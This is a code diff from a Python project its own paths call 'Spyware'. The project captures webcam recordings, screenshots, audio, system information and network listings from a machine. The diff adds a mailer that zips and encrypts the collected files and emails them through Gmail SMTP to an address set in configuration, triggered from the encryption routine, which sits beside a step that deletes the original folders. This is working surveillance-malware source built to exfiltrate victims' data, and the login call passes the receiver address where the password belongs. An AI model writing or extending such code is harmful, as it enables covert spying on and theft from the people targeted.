@@ -6,6 +6,7 @@ from PIL import ImageGrab
 import sounddevice as sd
 import wavfile as wf
 import os
+from dotenv import load_dotenv
 import time
 import socket
 from requests import get
@@ -20,6 +21,10 @@ import shutil
 import pyautogui
 from screeninfo import get_monitors
 import numpy as np
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
 
 
 # Base class for widely used variables
@@ -29,12 +34,17 @@ class BaseClass:
         self.currentDate = date.today()
         self.currentTime = datetime.now()
 
+        # Load config settings - mail and password
+        self.load_dotenv = load_dotenv()
+        self.gmail_address_sender = os.getenv("GMAIL_ADDRESS_SENDER")
+        self.gmail_address_receiver = os.getenv("GMAIL_ADDRESS_RECEIVER")
+
         # Base definition of folder_path
-        self.folder_path_recordings = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Recordings"
-        self.folder_path_screenshots = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Screenshots"
-        self.folder_path_soundfiles = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Soundfiles"
-        self.folder_path_sys_info = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Systeminformation"
-        self.folder_path_cmd_prompts = r"C:\Users\deniz\PycharmProjects\Spyware\Features\CMDPrompts"
+        self.folder_path_recordings = os.getenv("FOLDER_PATH_RECORDINGS")
+        self.folder_path_screenshots = os.getenv("FOLDER_PATH_SCREENSHOTS")
+        self.folder_path_soundfiles = os.getenv("FOLDER_PATH_SOUNDFILES")
+        self.folder_path_sys_info = os.getenv("FOLDER_PATH_SYS_INFO")
+        self.folder_path_cmd_prompts = os.getenv("FOLDER_PATH_CMD_PROMPTS")
 
 
 class Webcamera(BaseClass):
@@ -48,7 +58,8 @@ class Webcamera(BaseClass):
         self.folder_path = self.folder_path_recordings
         self.output_file_name = "Recording.mp4"
 
-    def get_screen_size(self):
+    @staticmethod
+    def get_screen_size():
         try:
             monitors = get_monitors()
             main_monitor = monitors[0]
@@ -310,7 +321,7 @@ class CmdPrompts(BaseClass):
             get_os = platform_switch.get(platform_name)
 
             if get_os:
-                netstat_output = get_os() # Call the lambda function
+                netstat_output = get_os()  # Call the lambda function
 
                 listening_lines = [line for line in netstat_output.split('\n') if 'LISTENING' in line]
                 self.netstat_data = '\n'.join(listening_lines)
@@ -330,6 +341,41 @@ class CmdPrompts(BaseClass):
 
             f.write("------------------------------END------------------------------\n\n\n")
 
+
+class SendMail(BaseClass):
+    def __init__(self):
+        super().__init__()  # Call the base class __init__ method
+
+        self.mail_subject = "Data"
+        self.mail_body = None
+
+        # Load config settings - mail and password
+        self.load_dotenv = load_dotenv()
+        self.gmail_address_sender = os.getenv("GMAIL_ADDRESS_SENDER")
+        self.gmail_address_receiver = os.getenv("GMAIL_ADDRESS_RECEIVER")
+        self.gmail_password = os.getenv("GMAIL_PASSWORD")
+
+    def send_mail(self, zip_file_path):
+        message = MIMEMultipart("alternative")
+        message["Subject"] = self.mail_subject
+        message["From"] = self.gmail_address_sender
+        message["To"] = self.gmail_address_receiver
+
+        # Attach the ZIP file
+        with open(zip_file_path, "rb") as file:
+            attachment = MIMEBase("application", "zip")
+            attachment.set_payload(file.read())
+            encoders.encode_base64(attachment)
+            attachment.add_header("Content-Disposition", "attachment", filename="Encrypted_Folders.zip")
+            message.attach(attachment)
+
+        # Send the email
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login(self.gmail_address_sender, self.gmail_address_receiver)
+            server.send_message(message)
+
+
 class FileEncryption(BaseClass):
     def __init__(self):
         super().__init__()  # Call the base class __init__ method
@@ -346,6 +392,11 @@ class FileEncryption(BaseClass):
         ]
 
         self.base_folder = os.path.dirname(os.path.commonprefix(self.folders))
+
+        # Load config settings - mail and password
+        self.load_dotenv = load_dotenv()
+        self.gmail_address_sender = os.getenv("GMAIL_ADDRESS_SENDER")
+        self.gmail_address_receiver = os.getenv("GMAIL_ADDRESS_RECEIVER")
 
     def generate_key(self):
         key = Fernet.generate_key()
@@ -387,6 +438,7 @@ class FileEncryption(BaseClass):
                     f.write(encrypted_content)
 
     def encrypt_folders(self):
+        # Generate key
         self.generate_key()
 
         # Create the "encrypted_folders" directory if it doesn't exist
@@ -402,6 +454,12 @@ class FileEncryption(BaseClass):
                 for file in files:
                     file_path = os.path.join(root, file)
                     zip_file.write(file_path, os.path.relpath(file_path, self.encrypted_folders_dir))
+
+        # Send the email with the ZIP file as an attachment
+        mailer = SendMail()
+        mailer.sender_mail = self.gmail_address_sender  # Set your own Gmail address
+        mailer.receiver_mail = self.gmail_address_receiver  # Set your own Gmail address
+        mailer.send_mail(self.zip_file_path)
 
     def delete_files(self):
         # Delete all the original folders
